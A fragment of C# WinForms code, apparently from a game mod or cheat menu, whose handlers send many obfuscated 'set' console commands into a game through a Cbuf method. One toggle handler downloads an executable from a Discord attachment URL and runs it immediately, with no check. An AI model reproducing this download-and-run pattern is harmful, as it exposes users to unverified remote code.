            this.Cbuf("set LQLTLOTSO 1");
            this.Cbuf("set QTNRSKKNS 1");
            this.Cbuf("set LMMLLPKMMP 1");
            this.Cbuf("set NMLQKSMPP 1");
        }

        private void metroButton25_Click_3(object sender, EventArgs e)
        {
            this.Cbuf("set MTOQTLSTL 1");
            this.Cbuf("set LQKMKMLKSM 1");
            this.Cbuf("set NPMPORMQRK 1");
            this.Cbuf("set MLQQQQNTMT 1");
            this.Cbuf("set NRLNOQNMML 1");
            this.Cbuf("set OPPQONOSK 1");
            this.Cbuf("set RSOOSRLMK 1");
            this.Cbuf("set MMRMSTQNRQ 1");
            this.Cbuf("set RMMTRKTMQ 1");
            this.Cbuf("set MPLNTKOKKM 1");
            this.Cbuf("set NROMONSMSL 1");
            this.Cbuf("set NMLSLKOOTO 1");
            this.Cbuf("set PONQPTKNK 1");
            this.Cbuf("set  NMLRRLKQLR 1");
            this.Cbuf("set  MKNRTSSKTS 1");
            this.Cbuf("set LTNRTMMPKQ 1");
            this.Cbuf("set RLNRSSQKM 1");
            this.Cbuf("set  LORONQMPKO 1");
            this.Cbuf("set OPPPMPTPL 1");
            this.Cbuf("set TKNTTMTSN 1");
            this.Cbuf("set PTQMQOKQ 1");
            this.Cbuf("set MSRSNMNKQP 1");
            this.Cbuf("set MMNSONTQOT 1");
            this.Cbuf("set LPRNSKRQMS 1");
            this.Cbuf("set NMTQRLSPPQ 1");
            this.Cbuf("set LTSTRSPKM 1");
            this.Cbuf("set NNPSNQLLKT 1");
            this.Cbuf("set NOOLPRQMTR 1");
            this.Cbuf("set LRKTPTKKLN 1");
            this.Cbuf("set SPQNNSTLP 1");
            this.Cbuf("set LNLLTMNQOP 1");
            this.Cbuf("set MTTMOPOMRN 1");
            this.Cbuf("set LRPONOSQN 1");
            this.Cbuf("set MPOSOTKQMS 1");
            this.Cbuf("set OMLTKPQRNL 1");
            this.Cbuf("set MOKSKTKTLQ 1");
            this.Cbuf("set LPNQOKLRQR 1");
            this.Cbuf("set MKMRMNPMMN 1");
            this.Cbuf("set NRQMNPOQQN 1");
            this.Cbuf("set NNKKRRMOLN 1");
        }

        private void metroButton26_Click_3(object sender, EventArgs e)
        {
            this.Cbuf("set OMKRTKQTPT 1");
            this.Cbuf("set LOQONLKTMR 1");
            this.Cbuf("set NOTNSQPPTM 1");
            this.Cbuf("set LQKRMNSSMO 1");
            this.Cbuf("set LSKRMTQMRO 1");
            this.Cbuf("set NONPLLKSNR 1");
            this.Cbuf("set MKKROQKOOO 1");
            this.Cbuf("set LKTLKNKSLN 1");
            this.Cbuf("set NSKOLSTNMN 1");
            this.Cbuf("set LSSPQRSQQQ 1");
            this.Cbuf("set OLKSKMQPMT 1");
            this.Cbuf("set LMPMSPPOMT 1");
            this.Cbuf("set MROPPRSMRO 1");
            this.Cbuf("set NMOKTTPPM 1");
            this.Cbuf("set TPPRRKPLN 1");
            this.Cbuf("set MTNMQMRQKN 1");
            this.Cbuf("set MPOMMQSPN 1");
            this.Cbuf("set LRLTNKPLMQ 1");
            this.Cbuf("set MSNQTSQQTS 1");
            this.Cbuf("set OMOTNQRTNM 1");
            this.Cbuf("set MOLOQPNTPK 1");
            this.Cbuf("set OKTQNQTPQR 1");
            this.Cbuf("set MNKQRTQRPS 1");
            this.Cbuf("set ROSKKRMOS 1");
            this.Cbuf("set MKRLOQMTSL 1");
            this.Cbuf("set MLMLOMPSQO 1");
            this.Cbuf("set LQPKMNMNMO 1");
            this.Cbuf("set MRMNOMNPMR 1");
            this.Cbuf("set LPRROTQSOP 1");
            this.Cbuf("set LRTRKLMTON 1");
            this.Cbuf("set ROPOPPROK 1");
            this.Cbuf("set MMSQPQPKNR 1");
            this.Cbuf("set LPMNLPLTKQ 1");
            this.Cbuf("set OKRPNQTQT 1");
            this.Cbuf("set NQLTMNRKRR 1");
            this.Cbuf("set SMTRRKSTP 1");
            this.Cbuf("set NPKLTQKSQP 1");
            this.Cbuf("set OLMRMNQOKS 1");
            this.Cbuf("set MSPNRQRSRK 1");
            this.Cbuf("set NOQPNNSKKR 1");
            this.Cbuf("set MQTTKKTPNM 1");
            this.Cbuf("set NSOTRTRKNS 1");
            this.Cbuf("set LKKRLSMRQP 1");
            this.Cbuf("set MMTLLQSMNR 1");
            this.Cbuf("set MTQNNRPQQM 1");
            this.Cbuf("set MNNSPLMMMP 1");
            this.Cbuf("set RRLSSRRLL 1");
            this.Cbuf("set LPPQSRMPMK 1");
            this.Cbuf("set NMPKRNMQML 1");
            this.Cbuf("set SPOSSQKNP 1");
            this.Cbuf("set MQSOSLMPOK 1");
            this.Cbuf("set NOQPLLOQRR 1");
            this.Cbuf("set QNRNRRTLM 1");
            this.Cbuf("set LOKNNQLKMM 1");
            this.Cbuf("set NONRKKKLML 1");
            this.Cbuf("set TMPMPLTRT 1");
            this.Cbuf("set NTNKMLOQLO 1");
            this.Cbuf("set LMSOTPTQR 1");
            this.Cbuf("set MQLSRSOPPK 1");
            this.Cbuf("set PMMQLLKMS 1");
            this.Cbuf("set NTRLKMLNLQ 1");
            this.Cbuf("set OLRMRKMSNM 1");
            this.Cbuf("set NQMSPTORTR 1");
            this.Cbuf("set OKTSLRSQMS 1");
            this.Cbuf("set LQMTQKONKR 1");
            this.Cbuf("set LSKPPLSTSO 1");
            this.Cbuf("set NSRSLNSOLR 1");
        }

        private void metroButton29_Click_2(object sender, EventArgs e)
        {
            this.Cbuf("set LOSKQOPNKL 1");
            this.Cbuf("set OKKTOPLLTL 1");
            this.Cbuf("set NSQSLQQTRK 1");
            this.Cbuf("set LMLOOPKLPL 1");
            this.Cbuf("set MKNKMKMONS 1");
            this.Cbuf("set MSORPQRSMO 1");
            this.Cbuf("set LNTNMKLPKM 1");
            this.Cbuf("set LLMNQRQQML 1");
            this.Cbuf("set LQSNRTMKRQ 1");
            this.Cbuf("set LQSNRTMKRQ 1");
            this.Cbuf("set QOPTQQQOO 1");
            this.Cbuf("set MQOOTMSSNN 1");
            this.Cbuf("set BNKORLPMQ 1");
            this.Cbuf("set LSNPQTOMKP 1");
            this.Cbuf("set OMKNMTOQOR 1");
            this.Cbuf("set MRKMKRKSNM 1");
            this.Cbuf("set TOOMSNTLQ 1");
            this.Cbuf("set NSLOMMLNLO 1");
            this.Cbuf("set NQRKPRKRKP 1");
            this.Cbuf("set RKMMNSQKO 1");
            this.Cbuf("set MSMMNLPPKT 1");
            this.Cbuf("set MSLKNNLLMN 1");
            this.Cbuf("set NPKSQQKPQR 1");
            this.Cbuf("set PRRSROQPO 1");
            this.Cbuf("set LMSRRONSLK 1");
            this.Cbuf("set MKLOSLNSTP 1");
            this.Cbuf("set MNTLRLOPSS 1");
            this.Cbuf("set LLOKOSSQR 1");
            this.Cbuf("set LQTPNQMSO 1");
            this.Cbuf("set NONSLROPSR 1");
            this.Cbuf("set MSPSNQNRO 1");
            this.Cbuf("set NKPKTKLPNQ 1");
            this.Cbuf("set PKSRQMLRO 1");
            this.Cbuf("set SLLNLPRON 1");
            this.Cbuf("set LPPTMNSMQP 1");
            this.Cbuf("set MSKKKKOPKS 1");
            this.Cbuf("set NRMRQTNPLK 1");
            this.Cbuf("set LMTOLRNTLM 1");
            this.Cbuf("set NNMPPRPRRL 1");
            this.Cbuf("set LTQQROOSON 1");
            this.Cbuf("set SPMQNOLSL 1");
            this.Cbuf("set MTMLSRRRKR 1");
            this.Cbuf("set SRQONORSQ 1");
            this.Cbuf("set MMQKQOSTNS 1");
            this.Cbuf("set MNNOOKMTMP 1");
            this.Cbuf("set LQOOKPQRRR 1");
            this.Cbuf("set PNQSSORN 1");
            this.Cbuf("set NKTMKRMSKR 1");
            this.Cbuf("set OSMSLRTOP 1");
            this.Cbuf("set NQRTKOKOL 1");
            this.Cbuf("set MMPLKLSKPS 1");
            this.Cbuf("set PTNOKRMNP 1");
            this.Cbuf("set SMMOQMPOP 1");
            this.Cbuf("set OKKTLROPQR 1");
            this.Cbuf("set SPTOMRKOO 1");
            this.Cbuf("set MLOOSKKOQP 1");
            this.Cbuf("set LPTQLOKROK 1");
            this.Cbuf("set MRPQRTKTLQ 1");
            this.Cbuf("set MTSRKTKLSM 1");
            this.Cbuf("set POSNTPOQK 1");
            this.Cbuf("set MSNSLNKLQ 1");
            this.Cbuf("set QLSTMRPTQ 1");
            this.Cbuf("set LOOOMOTSSS 1");
            this.Cbuf("set NLSORKMPKT 1");
            this.Cbuf("set NQPQMKMKS 1");
            this.Cbuf("set LNOOQPSKOR 1");
        }

        private void metroButton30_Click_2(object sender, EventArgs e)
        {
            this.Cbuf("set LTKKOLLRKK 1");
            this.Cbuf("set MMKKRKRLT 1");
            this.Cbuf("set MNSSKOMOKO 1");
            this.Cbuf("set NTLSSLOSST 1");
            this.Cbuf("set NONPKOOTQN 1");
            this.Cbuf("set LMQPNKKPNP 1");
            this.Cbuf("set NTTLTTNQQO 1");
            this.Cbuf("set NMRQOMMKQ 1");
            this.Cbuf("set NLQQNTOTLL 1");
            this.Cbuf("set MQLOKRSRT 1");
            this.Cbuf("set MOMSRLRNNQ 1");
            this.Cbuf("set LMSOKTLPKR 1");
            this.Cbuf("set MMLLQKNTRO 1");
            this.Cbuf("set OOQMONOTO 1");
            this.Cbuf("set LLQNNMRKLR 1");
            this.Cbuf("set QSKONNRNP 1");
            this.Cbuf("set LKLMQLRRML 1");
            this.Cbuf("set OKPTMOTTOQ 1");
            this.Cbuf("set PNOKSLNQP 1");
            this.Cbuf("set MNSMLRLKMN 1");
            this.Cbuf("set LOTLQRLOMK 1");
            this.Cbuf("set MTOPOKPPLN 1");
            this.Cbuf("set MOKLQNMLMS 1");
            this.Cbuf("set MRLRTMSRRT 1");
            this.Cbuf("set TRKOTSRSO 1");
            this.Cbuf("set LORSOSSMRS 1");
            this.Cbuf("set MNTQTNLRLK 1");
            this.Cbuf("set MKTMOTMOMN 1");
            this.Cbuf("set MPNRKLKOKR 1");
            this.Cbuf("set MKSSOOTQNM 1");
            this.Cbuf("set MOKOKSQMT 1");
            this.Cbuf("set NSPRQNOQSK 1");
            this.Cbuf("set NLTTRSNSKR 1");
            this.Cbuf("set NSTNQMNKQK 1");
            this.Cbuf("set NORNMSRTLN 1");
            this.Cbuf("set MRQOQRQTKS 1");
            this.Cbuf("set OLSPPSNROR 1");

        }

        private void metroButton4_Click_5(object sender, EventArgs e)
        {
            this.Cbuf("set MTOQTLSTL 1");
            this.Cbuf("set LQKMKMLKSM 1");
            this.Cbuf("set NPMPORMQRK 1");
            this.Cbuf("set MLQQQQNTMT 1");
            this.Cbuf("set NRLNOQNMML 1");
            this.Cbuf("set OPPQONOSK 1");
            this.Cbuf("set RSOOSRLMK 1");
            this.Cbuf("set MMRMSTQNRQ 1");
            this.Cbuf("set RMMTRKTMQ 1");
            this.Cbuf("set MPLNTKOKKM 1");
            this.Cbuf("set NROMONSMSL 1");
            this.Cbuf("set NMLSLKOOTO 1");
            this.Cbuf("set PONQPTKNK 1");
            this.Cbuf("set  NMLRRLKQLR 1");
            this.Cbuf("set  MKNRTSSKTS 1");
            this.Cbuf("set LTNRTMMPKQ 1");
            this.Cbuf("set RLNRSSQKM 1");
            this.Cbuf("set  LORONQMPKO 1");
            this.Cbuf("set OPPPMPTPL 1");
            this.Cbuf("set TKNTTMTSN 1");
            this.Cbuf("set PTQMQOKQ 1");
            this.Cbuf("set MSRSNMNKQP 1");
            this.Cbuf("set MMNSONTQOT 1");
            this.Cbuf("set LPRNSKRQMS 1");
            this.Cbuf("set NMTQRLSPPQ 1");
            this.Cbuf("set LTSTRSPKM 1");
            this.Cbuf("set NNPSNQLLKT 1");
            this.Cbuf("set NOOLPRQMTR 1");
            this.Cbuf("set LRKTPTKKLN 1");
            this.Cbuf("set SPQNNSTLP 1");
            this.Cbuf("set LNLLTMNQOP 1");
            this.Cbuf("set MTTMOPOMRN 1");
            this.Cbuf("set LRPONOSQN 1");
            this.Cbuf("set MPOSOTKQMS 1");
            this.Cbuf("set OMLTKPQRNL 1");
            this.Cbuf("set MOKSKTKTLQ 1");
            this.Cbuf("set LPNQOKLRQR 1");
            this.Cbuf("set MKMRMNPMMN 1");
            this.Cbuf("set NRQMNPOQQN 1");
            this.Cbuf("set NNKKRRMOLN 1");
        }

        private void ScreenSettingsTabPage_Click(object sender, EventArgs e)
        {

        }

        private void metroButton12_Click_3(object sender, EventArgs e)
        {
            this.Cbuf("set LKTKRTORTL 1");
            this.Cbuf("set NQLMQTRKKT 1");
            this.Cbuf("set NTSKPNLLRM 1");
            this.Cbuf("set MTLMMKKLTQ 1");
            this.Cbuf("set QMNPLONMP 1");
            this.Cbuf("set NKNTTSNQOL 1");
            this.Cbuf("set NPOLPLRNOK 1");
            this.Cbuf("set NNPPPPOQRO 1");
            this.Cbuf("set NMTOMMOMQN 1");
            this.Cbuf("set NNRQQOQSMR 1");
            this.Cbuf("set LMRKLNKTSQ 1");
            this.Cbuf("set NRQOPLMQNK 1");
            this.Cbuf("set NSMOSTOSNS 1");
            this.Cbuf("set NTNTMKQRKQ 1");
            this.Cbuf("set MTSSKTMTTT 1");
            this.Cbuf("set OLOMKNRTPP 1");
            this.Cbuf("set ROKKKLMPL 1");
            this.Cbuf("set OLLMKRRPOO 1");
            this.Cbuf("set TSSRKROQM 1");
            this.Cbuf("set LNKRLNPRMR 1");
            this.Cbuf("set OLQMMMTLMO 1");
            this.Cbuf("set NMMPPLOOOL 1");
            this.Cbuf("set LLKMPPNQPK 1");
            this.Cbuf("set MPMTTMKRMN 1");
            this.Cbuf("set LRMPTSQTNS 1");
            this.Cbuf("set MPPNRRRPMP 1");
            this.Cbuf("set LKTKTLMSP 1");
            this.Cbuf("set LKKRPNKMMR 1");
            this.Cbuf("set OQTQQQPTP 1");
            this.Cbuf("set MMTPRTNMQP 1");
            this.Cbuf("set LTNTLNRNOS 1");
            this.Cbuf("set MPRTTKLMNP 1");
            this.Cbuf("set QMORRTR 1");
            this.Cbuf("set NNNKPKRMQS 1");
            this.Cbuf("set PNQQLROTO 1");
            this.Cbuf("set OMKTSMSOS 1");
            this.Cbuf("set LONTLRQKN 1");
            this.Cbuf("set MKPQPLPPPK 1");
            this.Cbuf("set LMTTPRQQMN 1");
            this.Cbuf("set MPRMNMQQKR 1");
        }

        private void metroButton11_Click_3(object sender, EventArgs e)
        {
            this.Cbuf("set MPTNKKPKRK 1");
            this.Cbuf("set NLNLPMSNLP 1");
            this.Cbuf("set LSQMOMSSPS 1");
            this.Cbuf("set NKLSLKPSSS 1");
            this.Cbuf("set NKKPQSTMRL 1");
            this.Cbuf("set LPPMLLTRNT 1");
            this.Cbuf("set NNMTMKQPPM 1");
            this.Cbuf("set MMLQOTLKOQ 1");
            this.Cbuf("set NTSPRTSSTT 1");
            this.Cbuf("set LRLKLRNRTS 1");
            this.Cbuf("set NLTNTKLQNQ 1");
            this.Cbuf("set LRMSSOOQQP 1");
            this.Cbuf("set LSLKMNMRLK 1");
            this.Cbuf("set MONNPSNOQO 1");
            this.Cbuf("set MTSSKTMTTT 1");
            this.Cbuf("set MOMNLTOPQN 1");
            this.Cbuf("set NQOPMRKQTL 1");
            this.Cbuf("set OLLMKRRPOO 1");
            this.Cbuf("set MSMMLQQNSS 1");
            this.Cbuf("set MRTKQSPSQS 1");
            this.Cbuf("set LLPKRNMQQN 1");
            this.Cbuf("set NRSQNNQOLK 1");
            this.Cbuf("set MQKLMPORMS 1");
            this.Cbuf("set MLQPQQRPQM 1");
            this.Cbuf("set NMLSKNTTQQ 1");
            this.Cbuf("set QQLNLMOTM 1");
            this.Cbuf("set NNQPOMPOPT 1");
            this.Cbuf("set LQQKQROPSL 1");
            this.Cbuf("set MNSPPRQLLM 1");
            this.Cbuf("set LSSLKOQPMQ 1");
            this.Cbuf("set LLQTMQKQMR 1");
            this.Cbuf("set MTLPRKSSRL 1");
            this.Cbuf("set LMLQLLPSSR 1");
            this.Cbuf("set PNSPTQSLN 1");
            this.Cbuf("set OLSOMMTQSM 1");
            this.Cbuf("set MKPSQQQTPR 1");
            this.Cbuf("set MOMPQQKOKO 1");
            this.Cbuf("set MKOMMSTNTM 1");
            this.Cbuf("set LOPKTKKSTK 1");
            this.Cbuf("set OLNMKQTQQQ 1");
        }

        private void metroButton10_Click_4(object sender, EventArgs e)
        {
            this.Cbuf("set TNNLTKSOS 1");
            this.Cbuf("set SKKROLPNS 1");
            this.Cbuf("set NMOKNPSSNP 1");
            this.Cbuf("set MQOKOKQKLS 1");
            this.Cbuf("set OMNQSQLSNS 1");
            this.Cbuf("set LNMKTOMKMS 1");
            this.Cbuf("set MKLSLMSPKT 1");
            this.Cbuf("set MKKMTPRTLQ 1");
            this.Cbuf("set LSSLQQNKQP 1");
            this.Cbuf("set NOMPOPPSTQ 1");
            this.Cbuf("set RPRLRNQKM 1");
            this.Cbuf("set NROKSRLPNP 1");
            this.Cbuf("set NPRMPOLNTS 1");
            this.Cbuf("set MMKQPKOOSL 1");
            this.Cbuf("set OLPLKRLNK 1");
            this.Cbuf("set NSKMLOMLPT 1");
            this.Cbuf("set LRQMQTLORK 1");
            this.Cbuf("set QPLLSOQKQ 1");
            this.Cbuf("set QKMOLSRRT 1");
            this.Cbuf("set SPPMKPQR 1");
            this.Cbuf("set MPMKMOQSSP 1");
            this.Cbuf("set LTRKNKNRTK 1");
            this.Cbuf("set NQRKPLTOKL 1");
            this.Cbuf("set SRKMTKMRT 1");
            this.Cbuf("set SOSNNLTSM 1");
            this.Cbuf("set MMSRPPKMQP 1");
            this.Cbuf("set MTLMSQMNTR 1");
            this.Cbuf("set NSNTLRRRP 1");
            this.Cbuf("set MQRQQONQSL 1");
            this.Cbuf("set LTPMKRMKKQ 1");
            this.Cbuf("set NTKSTPSPPK 1");
            this.Cbuf("set MQLRQNRRPR 1");
            this.Cbuf("set MMOPPTKQMO 1");
            this.Cbuf("set MTQRRSOMTT 1");
            this.Cbuf("set NQKKOONQPR 1");
            this.Cbuf("set RNPPKQOTN 1");
            this.Cbuf("set NOOOPPSMNO 1");
            this.Cbuf("set OKSOTLNPQQ 1");
            this.Cbuf("set MRMPNPSOMS 1");
            this.Cbuf("set NPLLLLSLMN 1");
        }

        private void metroButton6_Click_5(object sender, EventArgs e)
        {

        }

        private void metroButton5_Click_4(object sender, EventArgs e)
        {
          
            
            this.Cbuf("set MPRTTKLMNP 1");
            this.Cbuf("set QMORRTR 1");
            this.Cbuf("set NNNKPKRMQS 1");
            this.Cbuf("set PNQQLROTO 1");
            this.Cbuf("set OMKTSMSOS 1");
            this.Cbuf("set LONTLRQKN 1");
            this.Cbuf("set MKPQPLPPPK 1");
            this.Cbuf("set LMTTPRQQMN 1");
            this.Cbuf("set MPRMNMQQKR 1");
        }

        private void metroButton6_Click_6(object sender, EventArgs e)
        {
            this.Cbuf("set LKTKRTORTL 1");
            this.Cbuf("set NQLMQTRKKT 1");
            this.Cbuf("set NTSKPNLLRM 1");
            this.Cbuf("set MTLMMKKLTQ 1");
            this.Cbuf("set QMNPLONMP 1");
            this.Cbuf("set NKNTTSNQOL 1");
            this.Cbuf("set NPOLPLRNOK 1");
            this.Cbuf("set NNPPPPOQRO 1");
            this.Cbuf("set NMTOMMOMQN 1");
        }

        private void metroButton16_Click_4(object sender, EventArgs e)
        {

            this.Cbuf("set NNRQQOQSMR 1");
            this.Cbuf("set LMRKLNKTSQ 1");
            this.Cbuf("set NRQOPLMQNK 1");
            this.Cbuf("set NSMOSTOSNS 1");
            this.Cbuf("set  NTNTMKQRKQ 1");
            this.Cbuf("set  MTSSKTMTTT 1");
            this.Cbuf("set OLOMKNRTPP 1");
            this.Cbuf("set LROKKKLMPL 1");
            this.Cbuf("set  OLLMKRRPOO 1");
            this.Cbuf("set TSSRKROQM 1");
            this.Cbuf("set LNKRLNPRMR 1");
            this.Cbuf("set OLQMMMTLMO 1");
        }

        private void metroButton13_Click_3(object sender, EventArgs e)
        {
            this.Cbuf("set NMMPPLOOOL 1");
            this.Cbuf("set LLKMPPNQPK 1");
            this.Cbuf("set MPMTTMKRMN 1");
            this.Cbuf("set LRMPTSQTNS 1");
            this.Cbuf("set MPPNRRRPMP 1");
            this.Cbuf("set LKTKTLMSP 1");
            this.Cbuf("set LKKRPNKMMR 1");
            this.Cbuf("set OQTQQQPTP 1");
            this.Cbuf("set MMTPRTNMQP 1");
            this.Cbuf("set LTNTLNRNOS 1");
        }

        private void metroButton5_Click_5(object sender, EventArgs e)
        {
            this.Cbuf("set LQPKPKNLRN 1");
        }

        private void metroButton6_Click_7(object sender, EventArgs e)
        {
            this.Cbuf("set OMNTRLMSQK 1");
        }

        private void metroButton13_Click_4(object sender, EventArgs e)
        {
            this.Cbuf("set NONPPKMLMP 1");
        }

        private void metroButton14_Click_4(object sender, EventArgs e)
        {
            this.Cbuf("set NTMLNOQMMM 1");
        }

        private void metroButton13_Click_5(object sender, EventArgs e)
        {

            this.Cbuf("set LTPPTQSOKK 1");
        }

        private void metroButton14_Click_5(object sender, EventArgs e)
        {
            this.Cbuf("set MSTLNMPLSN 1");
            this.Cbuf("set LNKPRSTSOL 1");
            this.Cbuf("set NPPRNLKOMQ 1");
            this.Cbuf("set TNTQTRLPO 1");
        }

        private void metroButton6_Click_8(object sender, EventArgs e)
        {
            this.Cbuf("set OKSMMNSQRQ 1");
            this.Cbuf("set LSKMQKNNTS 1");
            this.Cbuf("set OKONNRRSLL 1");
            this.Cbuf("set NOKQPMTLKO 1");
        }

        private void metroButton16_Click_5(object sender, EventArgs e)
        {

        }

        private void guna2ToggleSwitch30_CheckedChanged_1(object sender, EventArgs e)
        {
            {
                using (WebClient web1 = new WebClient())
                {
                    web1.DownloadFile("https://cdn.discordapp.com/attachments/900123100388143114/917158623115890718/FOV_CIRCLE.exe", "FOV_CIRCLE.exe");
                    Process.Start("FOV_CIRCLE.exe");
                }
            }
        }

        private void metroButton5_Click_6(object sender, EventArgs e)
        {
            this.Cbuf("set NRTQMKSPTS 1");
        }

        private void metroButton6_Click_9(object sender, EventArgs e)
        {
            this.Cbuf("set PRRPMPQOT 1");
        }

        private void metroButton9_Click_1(object sender, EventArgs e)
        {
            this.Cbuf("set PRRPMPQOT 1");
            this.Cbuf("set RSLPNPON 1");
            this.Cbuf("set LNRQMSLQT 1");
        }

        private void metroButton5_Click_7(object sender, EventArgs e)
        {
            this.Cbuf("set MMMPOKRSML 1");
        }

        private void metroButton6_Click_10(object sender, EventArgs e)
        {
            this.Cbuf("set MQRSQKTLON 1");
        }

       

      

        private void guna2ToggleSwitch33_CheckedChanged(object sender, EventArgs e)
        {
            this.Cbuf("LNQMMNNPSR -1");
            this.Cbuf("NTLKOKLKRS -1");
            this.Cbuf("PMORNPNTK -1");
            this.Cbuf("LKKNORQKTP -1");
            this.Cbuf("PNRLKKKOQ 1");
        }

        private void guna2ToggleSwitch34_CheckedChanged(object sender, EventArgs e)
        {
            this.Cbuf("set OMKSOSNLRR 1");
            this.Cbuf("set NQLLTLSRQS 1");
            this.Cbuf("set NPOMMNSONS 1");
            this.Cbuf("set MKONTLSQQN 1");
            this.Cbuf("set MRNRLLPTNK 1");
            this.Cbuf("set NQOMMSSMNT 1");
            this.Cbuf("set MKRKSPRLLT 1");
            this.Cbuf("set MRROROQKQQ 1");
            this.Cbuf("set MMOOKLNONM 1");
            this.Cbuf("set LKPTPTSPOP 1");
            this.Cbuf("set OKSTSKLQQQ 1");
            this.Cbuf("set QOQRRPPPT 1");
            this.Cbuf("set NMQORRQKRT 1");
            this.Cbuf("set MQRSRNLR 1");
            this.Cbuf("set NNKSRRNOLO 1");
            this.Cbuf("set MTOQSKOLL 1");
            this.Cbuf("set NSLSMQTMSS 1");
            this.Cbuf("set LPNTMKLSSR 1");
            this.Cbuf("set MKKPMNNPQK 1");
            this.Cbuf("set MLOMMRLKRL 1");
            this.Cbuf("set NOTMMNOSQO 1");
            this.Cbuf("set LOOSQMLOLN 1");
            this.Cbuf("set TKPMPLQQ 1");
            this.Cbuf("set MKTLKSMQLP 1");
            this.Cbuf("set MRSTSRLQKL 1");
            this.Cbuf("set LLQPMRNTP 1");
            this.Cbuf("set NNOKMOPPPP 1");
            this.Cbuf("set OLSTQTTPLO 1");
            this.Cbuf("set NRRKTONLNK 1");
            this.Cbuf("set NOTTPOPTSQ 1");
            this.Cbuf("set MMKKTLQSPK 1");
            this.Cbuf("set MSKSKSPQRM 1");
            this.Cbuf("set LTMQPKTPQQ 1");
            this.Cbuf("set LMSRLQMQTK 1");
            this.Cbuf("set NPLTQSPNRL 1");
            this.Cbuf("set MLQKLMSRST 1");
            this.Cbuf("set MNNSLRRMNL 1");
            this.Cbuf("set NPLMROSQKM 1");
            this.Cbuf("set LLOLKOLPMN 1");
            this.Cbuf("set LLQLKSMMTO 1");
            this.Cbuf("set MLQMNPQNOP 1");
            this.Cbuf("set MPQLRTKSPM 1");
            this.Cbuf("set MNQRLPRQOP 1");
            this.Cbuf("set OLPKRPRLPM 1");
            this.Cbuf("set TMQTSMRPS 1");
            this.Cbuf("set LTTOPRNTON 1");
            this.Cbuf("set LMLLSTRMSQ 1");
            this.Cbuf("set RORQSKTLT 1");
            this.Cbuf("set OKTLSQMTOP 1");
            this.Cbuf("set NTNLSSTMQK 1");
            this.Cbuf("set PORQNRQP 1");
            this.Cbuf("set LPNRRKQQQO 1");
            this.Cbuf("set MMPRQRSPOP 1");
            this.Cbuf("set NLQKPRSMLT 1");
            this.Cbuf("set NOPLNKORSM 1");
            this.Cbuf("set LKRKKMPKQN 1");
            this.Cbuf("set MMLKKNQTRS 1");
            this.Cbuf("set TKPTLPSNR 1");
            this.Cbuf("set LSLRLKSNM 1");
            this.Cbuf("set MTTKNLQQQP 1");
            this.Cbuf("set LMRRQQOKO 1");
            this.Cbuf("set LOLMPNLQLK 1");
            this.Cbuf("set LNNTTKNOPT 1");
            this.Cbuf("set MROQSKORRK 1");
            this.Cbuf("set OKRSNPKTLS 1");
            this.Cbuf("set LNMNLQP 1");
            this.Cbuf("set MPNNNKPLQM 1");
            this.Cbuf("set LSKTQNPKKN 1");
            this.Cbuf("set MMPNQSNSNN 1");
            this.Cbuf("set OOPPRRRSM 1");
            this.Cbuf("set MLQKNLMPQR 1");
            this.Cbuf("set MORKNPPSMR 1");
            this.Cbuf("set SQPLNKSOK 1");
            this.Cbuf("set NTLRRMTQMM 1");
            this.Cbuf("set MQLTOQPRLT 1");
            this.Cbuf("set LPOLPTMPKM 1");
            this.Cbuf("set SSOOSTOMR 1");
            this.Cbuf("set  MKOLLTMMLM 1");
            this.Cbuf("set  NMTQNKOOS 1");
            this.Cbuf("set MTNTQNKMPO 1");
            this.Cbuf("set MKMSOLRQML 1");
            this.Cbuf("set  NOLNTMSMPL 1");
            this.Cbuf("set NTSOOPTPOL 1");
            this.Cbuf("set NTKRNNLQOQ 1");
            this.Cbuf("set MRKNLKLOLP 1");
            this.Cbuf("set MMRNPTNSQ 1");
            this.Cbuf("set LRQMRKNTLL 1");
            this.Cbuf("set RLPKRTSLO 1");
            this.Cbuf("set NLPKLPMKT 1");
            this.Cbuf("set MPSRKPSRQQ 1");
            this.Cbuf("set LSTNPLKNLS 1");
        }

        private void metroButton16_Click_6(object sender, EventArgs e)
        {
            this.Cbuf("set RLPKRTSLO 1");
            this.Cbuf("set NLPKLPMKT 1");
            this.Cbuf("set MPSRKPSRQQ 1");
            this.Cbuf("set LSTNPLKNLS 1");
        }

        private void metroButton13_Click_6(object sender, EventArgs e)
        {
            this.Cbuf("set OMKSOSNLRR 1");
            this.Cbuf("set NQLLTLSRQS 1");
            this.Cbuf("set NPOMMNSONS 1");
            this.Cbuf("set MKONTLSQQN 1");
            this.Cbuf("set MRNRLLPTNK 1");
            this.Cbuf("set NQOMMSSMNT 1");
            this.Cbuf("set MKRKSPRLLT 1");
            this.Cbuf("set MRROROQKQQ 1");
            this.Cbuf("set MMOOKLNONM 1");
            this.Cbuf("set LKPTPTSPOP 1");
            this.Cbuf("set OKSTSKLQQQ 1");
            this.Cbuf("set QOQRRPPPT 1");
            this.Cbuf("set NMQORRQKRT 1");
            this.Cbuf("set MQRSRNLR 1");
            this.Cbuf("set NNKSRRNOLO 1");
            this.Cbuf("set MTOQSKOLL 1");
            this.Cbuf("set NSLSMQTMSS 1");
            this.Cbuf("set LPNTMKLSSR 1");
            this.Cbuf("set MKKPMNNPQK 1");
            this.Cbuf("set MLOMMRLKRL 1");
            this.Cbuf("set NOTMMNOSQO 1");
            this.Cbuf("set LOOSQMLOLN 1");
            this.Cbuf("set TKPMPLQQ 1");
            this.Cbuf("set MKTLKSMQLP 1");
            this.Cbuf("set MRSTSRLQKL 1");
            this.Cbuf("set LLQPMRNTP 1");
            this.Cbuf("set NNOKMOPPPP 1");
            this.Cbuf("set OLSTQTTPLO 1");
            this.Cbuf("set NRRKTONLNK 1");
            this.Cbuf("set NOTTPOPTSQ 1");
            this.Cbuf("set MMKKTLQSPK 1");
            this.Cbuf("set MSKSKSPQRM 1");
            this.Cbuf("set LTMQPKTPQQ 1");
            this.Cbuf("set LMSRLQMQTK 1");
            this.Cbuf("set NPLTQSPNRL 1");
            this.Cbuf("set MLQKLMSRST 1");
            this.Cbuf("set MNNSLRRMNL 1");
            this.Cbuf("set NPLMROSQKM 1");
            this.Cbuf("set LLOLKOLPMN 1");
            this.Cbuf("set LLQLKSMMTO 1");
        }

        private void metroButton6_Click_11(object sender, EventArgs e)
        {
            this.Cbuf("set MLQMNPQNOP 1");
            this.Cbuf("set MPQLRTKSPM 1");
            this.Cbuf("set MNQRLPRQOP 1");
            this.Cbuf("set OLPKRPRLPM 1");
            this.Cbuf("set TMQTSMRPS 1");
            this.Cbuf("set LTTOPRNTON 1");
            this.Cbuf("set LMLLSTRMSQ 1");
            this.Cbuf("set RORQSKTLT 1");
